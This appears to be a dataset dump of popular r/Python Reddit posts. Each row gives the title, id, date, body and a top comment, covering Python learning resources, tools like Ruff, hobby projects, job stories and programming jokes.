* This course is for beginners and assumes no previous programming experience, but the second half is useful for experienced programmers who want to learn about various third-party Python modules.
* If you don't have time to take the course now, that's fine. Signing up gives you lifetime access so you can work on it at your own pace.
* This Udemy course covers roughly the same content as the 1st edition book (the book has a little bit more, but all the basics are covered in the online course), which you can read for free online at https://inventwithpython.com
* The 2nd edition of Automate the Boring Stuff with Python is free online: https://automatetheboringstuff.com/2e/
* I do plan on updating the Udemy course for the second edition, but it'll take a while because I have other book projects I'm working on. If you sign up for this Udemy course, you'll get the updated content automatically once I finish it. It won't be a separate course.
* It's totally fine to start on the first edition and then read the second edition later. I'll be writing a blog post to guide first edition readers to the parts of the second edition they should read.
* I wrote a blog post to cover [what's new in the second edition](https://inventwithpython.com/blog/2019/10/07/whats-new-in-the-2nd-edition-of-automate-the-boring-stuff-with-python/)
* **You're not too old to learn to code. You don't need to be ""good at math"" to be good at coding.**
* Signing up is the first step. Actually finishing the course is the next. :) [There are several ways to get/stay motivated.](https://www.reddit.com/r/learnprogramming/wiki/faq#wiki_how_can_i_get.2Fstay_motivated_to_learn_programming.3F) I suggest getting a ""gym buddy"" to learn with. Check out /r/ProgrammingBuddies",Or you can name it how to automate yourself out of your boring job and into a better one.  I remember reading this five years ago... I ended up automating most of my accounting work and left for tech. And now I am making more than I ever dreamed of and loving every minute of it.
I made a download bar in terminal with Python!,b7oizi,2019-03-31 22:48:20,,"First thought - reminds me of ""pip install"""
First time coding anything other than HTML on my first day at university (Except the cls function),avnpue,2019-02-28 14:12:31,,"Save your first program and then look back on it by the time you graduate. 

You’ll be amazed at how far you’ve come "
Python is the 2nd most demanded programming language in 2022,vtiz4o,2022-07-07 21:40:35,,"Somehow I read this as ""python 2 is the most demanded..."" and recoiled in horror momentarily."
"We Downloaded 10,000,000 Jupyter Notebooks From Github – This Is What We Learned",kisczb,2020-12-23 20:40:12,,Do those 10mil include the 20 or so notebooks I made for the Advent of Code 2020 challenge? Probably not the best representation of the state of data science there.
"In case of fire, light a fire.",5fqln4,2016-12-01 00:42:57,,"In case of a very specific and contextually important fire, light everything on fire to hide it."
The Ruff python linter is insanely good,11syxd0,2023-03-17 00:30:20,"I just migrated some of my projects over to using [ruff](https://github.com/charliermarsh/ruff), and I am EXTREMELY impressed. It is quite literally 100 times faster than my previous linting configuration, all while being more organized and powerful. It's mind boggling fast. It has all of the plugins builtin that I was previously using with tools like flake8. It hooks into `pre-commit` and replaces many plugins I had before like:

* `isort` - sorts imports
* `bandit` - finds common security issues
* `flake8` - linter; additional benefit is that I can now delete my \`.flake8\` file.
* `pygrep-hooks` - common misc linting

Additionally, it's completely configurable via pyproject.toml, so that always feels good.

By the way, if you want to checkout my python template, it has my preferred ruff configuration:[https://github.com/BrianPugh/python-template](https://github.com/BrianPugh/python-template)","It’s the Python tool people always wanted, but just didn’t know when we were blinded by flake8+flake8-bugbear+flake8-rst+flake8-docstrings+pyupgrade…

Blows my mind that it’s less than a year since getting “big” and it’s already used by [all these projects](https://github.com/charliermarsh/ruff#whos-using-ruff). Cibuildwheel, scipy, pandas, jupyter, fastapi, sphinx… those are projects that have touched 100% of Python programmers"
Python has clearly overtaken Java in popularity on StackOverflow and trails only JavaScript,6wmsbq,2017-08-29 06:02:00,,"If I was stuck on an island and had to choose one thing to have with me, it'd be python. That way I can die doing what I love."
"I created a python module for command line checkboxes, better yes/no or number input.",9x1smv,2018-11-15 00:50:55,,"It is on [GitHub](https://github.com/kamik423/cutie) and [pypi](https://pypi.org/project/cutie). You can install it with `pip3 install cutie`. The source code for the example and documentation is at both those locations.

**EDIT**: I just noticed, that the gif does not show everything clearly. There is a Yes/No question at the beginning and the quest is secure text input. I updated the gif on [the GitHub](https://github.com/kamik423/cutie), but I cannot change the post. It also shows the sentence at the end for longer."
"If you're a beginner interested in data science and machine learning, I recently produced a video series that goes through all of the major algorithms and their implementations in Python! I put a lot of work into each tutorial, so hopefully this helps out!",xyyj9t,2022-10-09 01:32:33,,"Thanks for creating this. I’ll just say that it would be terrific if you could transcribe it as well and post the text. 

I find videos too linear and slow and prefer to read ahead and listen/watch the parts where I need clarity or explanation. 

But that may just be me. My 2c."
Ubuntu plans to switch to Python3 by default for the 16.04 release.,35abd2,2015-05-08 21:01:33,,"Great news. Python 3's new features are fantastic, and it needs to go mainstream.

What packages are people still using that haven't yet been implemented in Python 3? I know that list is getting shorter, and it would be cool to see the open source community rally to finish them off."
"Kroger CLI, automation utility to save on shopping, earn points, get purchases summary and more",gr4jjn,2020-05-27 04:06:14,,"I got tired of manually applying the digital coupons while grocery shopping and decided to automate the process. While doing so I've added extra features. At this time this python's cli can:

- Clip all Digital Coupons to your card;
- Display Purchases Summary;
- Retrieve Points Balance;
- Complete the Feedback Survey on your behalf (to earn 50 fuel points and enter the sweepstake).

I'm planning to add more features in the future:

- purchased items (receipt data) Excel export, which could be useful for budgeting/categorization/filtering;
- notification on when certain items go on sale;
- and probably more.

The software is open-source and [more details available on GitHub](https://github.com/Shmakov/kroger-cli). And here is the [link to download current Windows Release](https://github.com/Shmakov/kroger-cli/releases/download/v0.0.2-beta/kroger-cli.exe).

This is very much a beta release and there could be bugs. All the feedback is welcome and hopefully it can help someone. Thanks!"
"Hi, I made a python script that changes your desktop wallpaper depending on the weather.",pjffa8,2021-09-07 11:58:50,"I used python to make this script quite a while ago and had only added it to GitHub recently. Anyways, it's quite straight forward, a script that uses a weather API to change your desktop wallpaper. 

&#x200B;

https://preview.redd.it/linebrkk80m71.jpg?width=3936&format=pjpg&auto=webp&s=c123eb811f47bb75837306d50b9c1832441a8f19

Check out the repo: [here](https://github.com/yangman946/WallPaperChanger)

Feel free to give thoughts or feedback.","My thoughts: cool, let's try it! Wait... Is this a windows thing? 

Honest question, from looking at the code I would say it is? 

Maybe I can fork a linux-clone :)"
What's the most simple & elegant piece of Python code you've seen?,ovjubg,2021-08-01 10:16:20,"For me, it's `someList[::-1]` which returns `someList` in reverse order.","Dictionary comprehensions are pretty neat, especially when trying to encode/decode words.

word2idx = {word:idx for idx, word in enumerate(wordlist)}

Also if you're creating a bar chart from a dictionary and want those bag of categories in descending order via their values:

sorted(cat_dict.items(), key=lambda x: x[1], reverse=True)"
Do you also use the python console and the python math libraries as a calculator?,n6wt6y,2021-05-07 19:59:16,I just want to know if anyone else does it,"Yup. All the time. I live in the terminal and Python math far exceeds anything I can do in my shell.

Also people don't typically know this trick, but with math in the Python REPL you can use `_` to reference the most recent answer. Like this:

```
>>> 3 + 8
11
>>> _ * 4
44
>>> 10 + _
54
>>> 3 * _ + 15
177
```

Saves lots of keystrokes."
Beginner to pro in Python [List of free resources],n3rapc,2021-05-03 16:37:56,,"What do I do after learning the basics and get to a point where I can write scripts that uses APIs and GUI Frameworks? I really want to learn more but feel like I have reached a block. I'm not that interested in web dev, but may try that out."
I would like to share an small personal project in Python,a2z1si,2018-12-04 17:07:27,"I was working in a small personal project, a text based video player for terminal using ascii chars, leave me an star in GitHub if you like [https://github.com/joelibaceta/video-to-ascii](https://github.com/joelibaceta/video-to-ascii)

&#x200B;

[Demo](https://reddit.com/link/a2z1si/video/kct37vmu68221/player)",This is awesome
"Bank statement analyzer GUI with pandas, matplotlib and PyQt5",f4oaag,2020-02-16 17:11:34,,Cool. source code?
A Python App with modern GUI,i7xb5f,2020-08-12 02:36:40,"Good day y'all,

Im a 15 year old Python dev and I've just finished building my first major Python project with UI. I tinkered a lot with tKinter (pun almost unintended) and even tried PyQT5. Both of these are time consuming to work with and tKinter's GUI looks like it shouldve been abandoned in 2005. Thats when my quest of finding an easy and modern looking UI Library started. And then I found Python Eel. Eel isnt a GUI Library like tKinter, but it can help link up python as backend with HTML/ CSS as the front. I didn't really know HTML and CSS a lot, but it was fairly easy. My project is at [https://github.com/JeswinSunsi/PentyDesktopAssistant](https://github.com/JeswinSunsi/PentyDesktopAssistant) . It has a bit of Spaghetti code, but its pretty neat. I would appreciate it if you guys could check it out and give a review. Also, star it if you can ;)

Thankss.  


Edit: After a lot of people told me, I gave another look into PyQt. Although I would still have designed Penty with Eel, PyQt actually doesn't seem too hard, that is, after the sorta steep learning curve. But once you've mastered the basics, it'd be way more readable and easier.

Edit 2: I never expected this post to get these many upvotes and positive comments. Thanks to everyone, y'all made my day! Also, you can PM me here if you have any doubts or want to tell me anything related to Python, I'll try my best to reply to everyone. Cheers!","I have a question, in your README.md file you have a section called prequesites with different modules you should install to run your app.

pip has a command, that stores all the requirements in a text file. 

     $ pip freeze > requirements.txt 

So when people needs to run your app, they can do

     $ pip install -r requirements.txt


And have you ever tried converting the app to an exe file?"
I'm too lazy to turn off my PC at nights. so made an app to turn it off with my phone,ulaj4a,2022-05-09 04:33:45,"
""Laziness"" is a common problem in programmers :D

Personally most of the nights, when I end up coding and go to bed, or go to watch Better call Saul on TV ( it's awesome ) I won't shut down my PC because I am a lazy person

I'm pretty sure most of you have same problem :)

So, to solve this and help the environment and reducing the energy consuming I wrote this little Django script.

This mini-web give you the power of shutting down your linux PC from your phone just with one single click :D

I called it LazyHelper🦥

Published here:
https://github.com/mehdiirh/LazyHelper","I am too lazy to turn off my pc so I spent the last 69 hours to make this app. This is how I read the title, nice work OP, Now explain why u turn off ur pc anyway?"
I created a video about how you can train a neural network (in python) to learn complex image/video classification tasks (like in-game detection) using transfer learning! The GitHub repo is linked in the video description. Hope this is useful or helpful for some of you guys :-),o8uw5a,2021-06-27 18:56:33,,[Here’s the GitHub link](https://github.com/ContentAutomation/NeuralNetworks) for anyone else like me who didn’t want to have to go to YouTube to get it.
"I landed a junior position coding in Python, I'm so excited and I'd LOVE advice",n332zn,2021-05-02 17:45:25,"Bit o' background: While I've always loved computers and dabbled with web dev as a kid, I recently (6ish months?) started coding again hardcore. I had just had a business fail, money was tight as shit, debt to our eyeballs... and I wanted to start again with one of my oldest passions that I'd always been afraid to pursue. So I hunkered down and got into Python, because I remembered liking the language. 

I pretty quickly got a job in non-Python web dev (Angular and Node.Js, which I was competent enough in thanks to dabbling) but it was awful. Barely over minimum wage, and despite being very junior I was expected to manage an entire code base and servers and essentially everything techy. So I did the best I could, kept working on my Python projects in my free time, and kept applying to new positions.

Eventually a recruiter took a liking to me, and got me some interviews for Python positions. One I totally bombed, but the other two actually ended in two very enthusiastic offers. I ended up being offered more than I'd even asked for, way more than I expected as a Junior. I took the offer and put in my notice at my old job, which ended this past Friday.

I just can't express how excited I am to have this opportunity, the company culture seems amazing, I'll be able to get out of debt, I'll have room to grow and learn and thrive... on one hand I couldn't have done it without reddit communities guiding me (hi, cscareerquestions and learnpython) and on the other hand I'm just so damn proud.

Anyways, I start on the 17th. I'm half sharing because I'm just really excited, but also, if anyone has advice for starting in a junior role with a huge company, I'd love to hear it. I want to give this my best shot. Thanks, y'all.","Learn git and some Linux commands. Also make a list or some other notes about new words, acronyms. Knowing what to Google is important when you get stack. 

Read and understand error messages. Not only from Python but OS as well. When I was on my internship I tended to ask my work buddy about every error I got. Response was always the same: what that error says? Google it."
Yeethon - Python but recompiled with yeet,mvz1no,2021-04-22 14:45:06,"Following a discussion in the Python discord server about the rust community wanting to add `yeet` as a reserved keyword, I decided to make this into an actual thing in Python. Python is great in that it's actually pretty simple to change its grammar once you know how to do so (editing the .gram file and regenerating a couple of files with `make regen-pegen`), after which you can recompile and voila, you have new grammar. In this case, I turned the `del` keyword into yeet, meaning you can write code like this:

&#x200B;

https://preview.redd.it/1vaacp4d8ou61.png?width=644&format=png&auto=webp&s=00551e90d20c101b776883b8a45b7854c3c4f19b

I hope this interests anyone, enjoy yeethon!  
p.s. You can find the repo for yeethon at https://github.com/Yeethon/cyeethon  
",Now substitute dict.get with yoink
Python programmers of reddit: what's the most useful tiny little efficiency you've discovered that's improved your programming hugely?,basnhi,2019-04-08 19:31:47,"Whether it's default dicts, enumerate, a way to combine functions really efficiently, or whatever, what's the best tiny trick you've discovered that's improved your code massively?","You can use underscores to enhance readability if you're dealing with huge numbers.
For example rewrite 10000000 into 10_000_000
"
100 Helpful Python Tips You Can Learn Before Finishing Your Morning Coffee,n96kk0,2021-05-10 22:46:17,,How uh... how big is your morning coffee?
Turtle module drawing a randomised landscape,7mo2l8,2017-12-29 01:44:21,,"This is a program I wrote using the Turtle module in Python 3.6.1 Most steps of the drawing are randomised using the Random module, such as the angle and height of each mountain, the number of trees, blades of grass, shape of lake, etc, so no execution of this program will produce quite the same picture. If you have any ideas for new parts or alterations, let me know and i'll try to implement them!

UPDATE:
Here's the code on Github
https://gist.github.com/razzledazze/b362d8c846c790e1fb8527076b1c5d42

UPDATE 2:
I've not used Github before but I hope this is right...
https://github.com/razzledazze/Turtle-Landscape"
Datetime changes in Python 4,mhrh1i,2021-04-01 17:18:23,,Finally. I had to monkey patch this into most of my code for years.
"I built a framework to stream from Kodi, Netflix, Amazon, and Youtube with your voice",krmqiu,2021-01-06 20:13:55,"## TL;DR: just gimme the gist:

The project: [https://gitlab.com/danielquinn/majel](https://gitlab.com/danielquinn/majel)

The demo:

[Reddit recompressed this video for optimal potato quality.  If you want a better version, have a look a the video in the repo.](https://reddit.com/link/krmqiu/video/pai4g8w1ep961/player)

Over the last year I've been working on a side project that leverages [Mycroft](https://mycroft.ai) (think: Alexa, but open-source and privacy-friendly) to do exciting things like stream video from Netflix, Amazon, and Youtube, or dig through your bookmarks for recipes etc.  It's finally in a state that I'm comfortable sharing with you all, [so here its](https://gitlab.com/danielquinn/majel).  I've named it *""Majel""* for [Majel Barrett-Roddenberry](https://en.wikipedia.org/wiki/Majel_Barrett), a reference that'll make sense if you're a Trekkie.

## Some technical notes about the architecture if you're interested:

[Architecture diagram](https://preview.redd.it/ypm0jjv5ep961.png?width=1670&format=png&auto=webp&s=79ac6127afe9b3b87f863c6fb12844b28d21a319)

Majel sits on top of Mycroft.ai's voice activation system as a set of three (at the moment anyway) ""skills"" that know what to do when certain voice commands are issued.  These skills do a little research around what a command might mean -- For example you could say: `""play the west wing""`, the `streamer-skill` will figure out where you're most likely to find [The West Wing](https://www.imdb.com/title/tt0200276/) (including your local `.mkv` files) and then push the location of the stream into Mycroft's [message bus framework](https://mycroft-ai.gitbook.io/docs/mycroft-technologies/mycroft-core/message-bus) and exit.

The other part of the equation is the `majel` program that just listens for these messages and then executes different processes based on what comes down the pipe.  If it gets a Netflix or Amazon URL for example, it'll point your browser (using Selenium) to the stream in question and ""click"" the play button, if it's a local file, it'll play it with MPV (thanks to `python-mpv`), etc.

Anyway, I'm really happy with how it's turned out and wanted to share.  It's licensed under the [AGPL](https://en.wikipedia.org/wiki/GNU_Affero_General_Public_License), so contributions are always welcome and I've designed it to be very pluggable so I'm hoping to extend it to do some more stuff later: search Google/DuckDuckGo for arbitrary stuff, dig up products on Amazon, and (if I can figure out a smart way to do it) video-call my parents.",Have you posted this in r/homeautomation? They would probably be interested.
Python 3.12 released,16y0op4,2023-10-03 00:08:09,,This is the one.
IT denied my request for python at work,q6stpy,2021-10-13 02:45:17,"EDIT: A couple months after this incident I started applying for python developer roles and I found a job just 2 months ago paying 40% more with work I really enjoy.


Hi, I talked to my boss recently about using python to assist me with data analysis, webscraping, and excel management. He said he doesn't have an issue but ask IT first. I asked my IT department and I got the response below. Is there some type of counter-argument I can come up with. I really would like to use python to be more efficient at work and keep developing my programming skills. If it matters I am currently an Electrical Engineer who works with a decent amount of data.

https://imgur.com/a/xVUGYJZ


Edit: I wanted to clarify some things. My initial email was very short: I simply asked for access to python to do some data analysis, computations, etc to help me with my job tasks. 

I just sent a follow up email to his response detailing what I am using python for. Maybe there was some miscommunication, but I don't intent on making my python scripts part of job/program where it would become a necessity and need to be maintained by anyone. Python would just be used as a tool to help me with my engineering analysis on projects I am working on and just improve my efficiency overall. So far I have not heard back from him. 


Our company is very old school, the people, equipment, technologies...","Love the line at the end.

>*Your limitation - it's only your imagination*

And apparently the IT department."
Getting Started With Google Map API in Python,jvsx60,2020-11-17 21:25:39,,"I've heard many people run into an issue sooner or later where the cost is hard to justify unless they are making money with their web apps hand over fist. 

Can anyone share if they have found an open source (or substantially cheaper) alternative that has the same degree of functionality and ease of integration?"
I made an application bot to apply to 100 internships with one click using Selenium and Python! Try it out for yourself (source code linked)!,dclphq,2019-10-03 12:02:37,,"I like it, it can be used for evil +1 (although spamming HR with 100's of applications might not be necessarily evil thing to do, some companies hiring process definitely deserves that)"
A neural network is trained on images of space and then asked to hallucinate new images [OC],b9nbj6,2019-04-05 13:35:47,,Source code: https://github.com/pearsonkyle/Neural-Nebula :)
Python Cheat Sheet for Beginners and Experts ⋆ Download for Practice,9iadda,2018-09-24 01:57:17,"Python Cheat Sheet can be really helpful when you’re trying a set of exercises related to a specific topic or working on a project. Rather than explaining to you the importance of cheat sheets, why not just begin with the most useful Python resources available on the internet (for free) in the form of cheat sheet.

You can download these Cheat Sheets in JPG format and PDF too.

1. [Python for Data Science Cheat Sheet (Datacamp)](https://sinxloud.com/python-cheat-sheet-beginner-advanced/#1-python-for-data-science-cheat-sheet-datacamp)
2. [Python Cheat Sheet for Data Science: Basics (Dataquest)](https://sinxloud.com/python-cheat-sheet-beginner-advanced/#2-python-cheat-sheet-for-data-science-basics-dataquest)
3. [Beginner's Python Cheat Sheet (Python Crash Course)](https://sinxloud.com/python-cheat-sheet-beginner-advanced/#3-beginners-python-cheat-sheet-python-crash-course)
4. [Python Cheat Sheet for Data Science: Intermediate (Dataquest)](https://sinxloud.com/python-cheat-sheet-beginner-advanced/#4-python-cheat-sheet-for-data-science-intermediate-dataquest)
5. [Importing Data in Python Cheat Sheet (Datacamp)](https://sinxloud.com/python-cheat-sheet-beginner-advanced/#5-importing-data-in-python-cheat-sheet-datacamp)
6. [Python Numpy Cheat Sheet (Dataquest)](https://sinxloud.com/python-cheat-sheet-beginner-advanced/#6-python-numpy-cheat-sheet-dataquest)
7. [Python Data Visualization: Bokeh Cheat Sheet (Datacamp)](https://sinxloud.com/python-cheat-sheet-beginner-advanced/#7-python-data-visualization-bokeh-cheat-sheet-datacamp)
8. [Pandas Cheat Sheet: Python for Data Science (Dataquest)](https://sinxloud.com/python-cheat-sheet-beginner-advanced/#8-python-for-data-science-pandas-cheat-sheet-dataquest)

**Share & Learn!** Do add your favourite Python Cheat Sheet in the comments below.",Thank you ! 
"Enso 2.0 is out! Visual programming in Python, Java, R, and JavaScript. Written in Rust and running in WebGL.",mqbkgm,2021-04-14 05:05:19,,"Hi, I'm Wojciech, one of the founders of Enso.

Enso is an award-winning interactive programming language with dual visual and textual representations. It is a tool that spans the entire stack, going from high-level visualization and communication to the nitty-gritty of backend services, all in a single language.

Enso is also a polyglot language - it lets you import any library from Enso, Java, JavaScript, R, or Python, and use functions, callbacks, and data types without any wrappers. The Enso compiler and the underlying GraalVM JIT compiler, compile them to the same instruction set with a unified memory model.

Check out:

* our **website**: [https://enso.org](https://enso.org/)
* our **GitHub** (Enso is Open Source): [https://github.com/enso-org/enso](https://github.com/enso-org/enso)
* the **GraalVM** website (which Enso compiler bases on): [https://www.graalvm.org](https://www.graalvm.org/)"
Images to ASCII,gve07s,2020-06-03 03:31:02,,You should try halfing the image height so the ascii image doesn’t look so stretched out.
Made my first web app using Python and Flask!,mmmqyo,2021-04-08 15:48:29,"Since English is not my first language, I frequently check definitions for complex words that I encounter. However, most of the online dictionaries contain unnecessary distractions such as pop ups and ads. So, I decided to create my own minimalist dictionary, improving both my coding skills and English vocabulary in the process :P

I used [this](https://dictionaryapi.dev/) API to fetch the definitions.

This is my very first flask project which I created in just 3 days. So, the code is quite ugly and the web app has quite a few bugs.

[Source](https://github.com/django0212/min-dic)

[The dictionary](http://min-dic.herokuapp.com/)","Definitely using as my dictionary - you're right, all the others have way too many ads.

Great work!"
Python changed the way I think,kwalp2,2021-01-13 14:13:25,"I started to learn python during the beginning stages of pandemic. One thing i learned during the journey with python is that mistakes are part and parcel of learning. Do you agree with me that getting bugs while running  a program teaches you a lot than a tutorial video? Someday while we debugging our code and spent whole day but still can't figure out the bug and next day within 15 minutes you figure out that you have forget to put collon :) 

Don't give up! But Sometimes its ok to take rest when everything is going against you and comeback later. 

So guys what is your life lesson which you have learned during the journey with python. I would love to hear that.",I learned that a clear idea of the *structure* of what you want at the end of your task is one of the most useful things you can have before you begin your task.
Announcing Support for Native Editing of Jupyter Notebooks in VS Code | Python,dfo892,2019-10-10 06:03:56,,"Very nice!

I was using Jupyter in VS Code already, but it converted to another format and behaved similarly, but it was closer to the debugging than working with jupyter.

Very excited about this since I'm scheduled to give a presentation on using Pandas and we were going to use Jupyter to do it."
"PSA: If you update a YML file used in CI to install or use Python 3.10, make sure to use “3.10” as a string. Otherwise is will most likely install Python 3.1.",qp7rg7,2021-11-08 14:30:25,,Now you have prevented people from getting the much stronger learning experience of failing and debugging for hours.
Machine Learning in a Year (in Python) - From noob to professional,527yxc,2016-09-11 18:30:44,,"As someone preparing to do his undergrad thesis in machine learning whilst knowing very little about it,  I hope to one day post a similar thread. Well done for your successes :) "
Struggling to structure code in larger programs? Great resources a beginner might not find so easily,m1w8sm,2021-03-10 20:18:40,,"There's also a good new Udemy course on the topic of creating large applications using OOP titled something like ""The complete python course: build 10 OOP programs""."
I made my first website for my Python project!,qtslkd,2021-11-14 23:51:27,"A few weeks ago I shown a python project I was working on, and since then, I worked on it, and added a lot of new features! But the most important thing about this post, is that I made a website for presenting it! I can understand that this isn't fully Python related, but I thought that it was the best way for presenting my project, rather than looking at a readme :)  
Also, I'm proud to say that I used Python a bit to generate the HTML on the three languages that it uses hehe. [This is the page.](https://darvil82.github.io/PBar/)

Thank you for taking a look!

&#x200B;

[One of the showcase code blocks on the page.](https://preview.redd.it/231aombj1lz71.png?width=595&format=png&auto=webp&s=c49b8a6c878d70ed4250ab99007d37769150f07c)",I love the narrative style to introduce the package. Good Job!
"Python is a hammer, and we are carpenters, building houses",s3pmg2,2022-01-14 18:53:28,"Something I struggled with for a long time is beginners, and it might just be a personal bias, but particular Python beginners. Both online and offline I see so many questions weekly that roughly fall into two camps

* Are there any universities that teach undergraduate CS purely using Python?
* How do I become a data analyst using Python\`?
* What should I learn to get a job as a python developer?
* How do I make quick money using Python?

While the other camp is roughly along the following lines

* I want to build a Python application that calls me and ask if I have taken my medicines.
* How do I build a website only using Python?
* I am playing game X, how do I train an AI to play the game perfectly?
* How do I make Python buy and sell crypto currency based on tweets?

I am not saying these are bad questions (from beginners), but they *irked* me. I was struggling to explain to beginners what the issue with questions such as these are. Is there an easy to understand analogy which would help. Finally, last night it struck me.

>Python is a hammer, and we are carpenters, building houses

Lets rephrase the initial questions with this background instead to show how absurd they become

* Are there any universities that teach carpentry only using a hammer?
* How do I become a roofer, framer, ship carpentry etc., only using a hammer?
* What should I learn to quickly get a job using a hammer?
* How do I make quick money using a hammer?

Now we see that the fundamental issue with the first sleeve of questions is that Python is a tool, we as programmers use, to solve problems. Limiting our toolbox to only using a single tool would make it impossible for us to work. **In addition we are offered jobs based on how well we are able to solve problems, not on the particular tools we know**. If I am adding someone to my team I am 99% sure they have never worked with our framework, and *I could not care less if they are Thor the god of hammers*. What I care about is if they can learn our framework, flow of work and seamlessly fit our team after half a year or so of on-board training.

Instead we should first look at what we are trying to do, and then pick the right tool for the job.

Similarly the issue with the second handful questions is unfamiliarity with programming and the amount of work required to make something. What I like with the carpentry analogy is also that it is easier to visualize the *scale*. A real life program (or a house) is a big project, something that requires multiple people, several weeks or months to make. 

Maybe the carpentry / hammer analogy will help next time someone asks:

""Hey I got this idea for a website, and I know you know Python, can you make it for me real quick?""","True, programming languages are just tools, and building software is just like construction. I've been using the ""building"" analogy for software for a while and I'm glad to see someone else sees it this way too."
Saturday Daily Thread: Resource Request and Sharing!,o7zo2z,2021-06-26 08:00:17,"Found a neat resource related to Python over the past week? Looking for a resource to explain a certain topic?

Use this thread to chat about and share Python resources!","I'm trying to build a web scraper for websites with dynamic content (JavaScript, etc). I'm trying to move away from Splash because of memory leak issues. 

Testing showed that Requests-HTML was not properly rendering dynamic content.

I might use Selenium, but it's so slow. 

More recently I tried to use QT, but I can't find a way to get the http error/status codes from QWebEnginePage. It seems QNetworkAccessManager doesn't work with QWebEnginePage.

Any help would be appreciated. Also, I'm a noob"
"Just launched my first production app, and the feeling is amazing",6smmr2,2017-08-10 00:30:29,"i work as an oss tech for a bank, i have a semi mathy hs/college background.

about a year ago my boss asked if there's any way we could monitor some machines we have up on racks in our DR site, i raised my hand and said i could write a python script that pings them and generates reports... he said 'awesome' do it... trouble was i had only a fleeting idea of what python is and no clue how to actually implement this...

i got home and started researching, took a couple of days to even start scripting anything but about a week later i had something that works... running this script is now one of my daily tasks

i then started tinkering with it sneakily during downtime even though i was technically never given permission to do it and eventually came up with a way to scrape user data from the network 24/7, i made it a point that this would be my own doing so research was limited to how to implement specific tasks and not downloading a ready made script off of github...

i've been logging this data for a while so i figured i should do something with it and started working on a support facing tkinter front end to streamline the way we handle support calls and tickets...

i showed it to my boss and he had me do a demo for the whole team today doing our team meeting... told everyone 'i encourage you to try it so we can get the bugs out, i'm later going to *tell* you to use it'... he said i'd also get dev time to improve it... everyone liked it and i've been getting good feedback about it... the feeling is amazing and i thought i'd share it with this community and maybe get some of your stories

EDIT: holy crap gold, and not for saying something silly, thank you kind stranger

EDIT 2: this kind of grew, i really want to thank everyone for the kind words of encouragement, i really only posted because i felt really excited pacing around the house after that meeting and felt i had to vent it all somehow, but this subreddit's response has been phoenomenal and has done a lot to further embolden me so i'm even more determined to progress now... thank all of you","Dude I love this story and your initiative, it's baller too that your boss is letting you run with it.

Go forth and continue to be awesome, I hope we hear an update soon."
Python 3.11 delivers.,zmgm6b,2022-12-15 17:03:02,,can someone please help understand what this graph is trying to convey?
1 year ago I started building Practice Probs - a site with 138 programming practice problems primarily focused on Python for data science,zzv4zt,2022-12-31 22:22:05,"[Link](https://www.practiceprobs.com/)

(Note: most of the solutions are gated, but **all** of the problems are free.)

One year ago, I came up with an idea to build a site similar StackOverflow, but with challenge problems to help people learn programming & data science topics. After a lot of effort (and some help along the way), I now have 138 problems on my platform.

- [Git](https://www.practiceprobs.com/problemsets/git/)
- [Google BigQuery](https://www.practiceprobs.com/problemsets/google-bigquery/)
- [Matplotlib](https://www.practiceprobs.com/problemsets/matplotlib/)
- [Metrics](https://www.practiceprobs.com/problemsets/metrics/)
- [pytest](https://www.practiceprobs.com/problemsets/pytest/)
- [Python NumPy](https://www.practiceprobs.com/problemsets/python-numpy/)
- [Python Pandas](https://www.practiceprobs.com/problemsets/python-pandas/)
- [Python Sparse Matrices](https://www.practiceprobs.com/problemsets/python-sparse-matrices/)
- [Pytorch](https://www.practiceprobs.com/problemsets/pytorch/)
- [Redis](https://www.practiceprobs.com/problemsets/redis/)
- [Regular Expressions In Python](https://www.practiceprobs.com/problemsets/regular-expressions-in-python/)
- [Selenium With Python](https://www.practiceprobs.com/problemsets/selenium-with-python/)
- [YouTube Data API](https://www.practiceprobs.com/problemsets/youtube-data-api/)

Hopefully some of you find this fun and helpful.","Nice job!  On the pandas page you have 
""pip insall pandas"",  it looks like you skipped the ""t""."
TIL if you type 'import antigravity' into a Python command line your default browser opens the XKCD comic 'Python' in a tab.,d3afje,2019-09-13 00:30:42,,"Try:

import this

&#x200B;

or 

from \_\_future\_\_ import braces"
"Prototype of Python-powered IoT device, gets how many subs are in r/Python plays sound when new ones are added",aqapmb,2019-02-14 03:55:49,,"Subscribe unsubscribe subscribe and so on, will work?"
Simple Django 3 tutorial project for beginners,oot77i,2021-07-22 00:16:38,"Hi, everyone!

I made 14 videos with a simple Django 3 Blog project for beginners.

So the touched topics are:

* Django project structure
* Routing a User's request and its handling, making a response to the User
* Using HTML templates and template inheritance (with Bootstrap 4)
* Storing data in a database with Models. Creating posts
* Using Tags for Posts, and ManyToMany relationships in Django.
* Class based views and Mixins.
* How to use Forms. Creating tags via Django forms.
* Creating posts via Django forms.
* Updating objects (posts and tags) via forms.
* And Deleting objects via forms.
* Using custom CSS (small admin panel for creating, updating and deleting posts and tags)
* How to restrict an access to certain pages.
* Pagination
* Basic search

The Demo video (1 m. 27 sec.):  
Is the first it the playlist

And the Youtube playlist:  
[https://www.youtube.com/watch?v=WeaL8o19D\_E&list=PLe4mIUXfbIqbbqgDSY6z9orgzIwvYZjtw](https://www.youtube.com/watch?v=WeaL8o19D_E&list=PLe4mIUXfbIqbbqgDSY6z9orgzIwvYZjtw)

Thanks for watching!",Lovely I was looking for a django tutorial
A complete web app to convert YouTube videos to MP3 files (with source for learning purpose),k003t6,2020-11-24 14:55:01,"Hi guys, I am learning Web Dev and hope to be a front end web developer soon, and I believe the best way is to practice. Then I made a the site with some technology which could be quite complicated for such a simple site, but I can learn a lot from that. As I learn all these stuff by myself after work, so feel free to correct me if I have done something wrong or any feedback would be much appreciated. Finally, I am not sure if I am close enough to be a junior web developer ? Any suggestion what else I should deep in? Thanks alot 

Here are some tech tools have been used:

\- Flask, SQLAlchemy, Flask-Dance

\- Google Cloud Logging 

\- Custom Web Socket Server for progess bar

\- VueJS, WebPack, Bootstrap for front end

\- PostgreSQL

\- PyTest

\- Social Authentication 

\- I also experiment with Google Cloud Firestore, which you can find in web/gdata folder

\- Supervisor, gunicorn with Nginx set up for production hosting 

The site basically let you convert any YT video less than 10 mins (you can configure in source code) to MP3 files, save it to DropBox, basic profile with history. 

Repo here: [https://github.com/infantiablue/converter](https://github.com/infantiablue/converter)

Live site here: [https://convertca.com](https://convertca.com/)

Cheers","> I am not sure if I am close enough to be a junior web developer ?

Yes, you are"
"Name a better learning resource than Schafer Corey, I'll wait",u2b3r9,2022-04-13 06:30:20,"I am really amazed by Schafer Corey on [YouTube](https://www.youtube.com/c/Coreyms/videos) especially since I am not the the type of guy that enjoys watching videos to learn, I am honestly in awe with his teaching skills and it inspires me to write blogs. I will be very curious to see if you guys have other high quality content.
